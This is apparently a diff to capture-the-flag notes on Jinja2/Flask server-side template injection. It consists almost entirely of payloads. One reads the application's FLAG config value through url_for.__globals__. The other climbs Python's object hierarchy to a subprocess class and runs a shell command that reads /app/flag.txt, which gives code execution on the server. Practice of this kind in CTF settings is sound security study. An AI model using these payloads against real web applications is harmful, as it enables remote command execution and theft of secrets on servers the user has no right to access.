@@ -1,4 +1,10 @@
+# part 1
+
 {{url_for.__globals__["current_app"].config["FLAG"]}}
 
 other variables are possible, like g, request, namespace, lipsum, range, session, dict, get_flashed_messages, cycler, joiner, config
 see https://ctftime.org/writeup/10895
+
+# part 2
+
+{{ ''.__class__.__mro__[1].__subclasses__()[520]("cat /app/flag.txt", shell=True, stdout=-1).communicate()[0].strip() }}
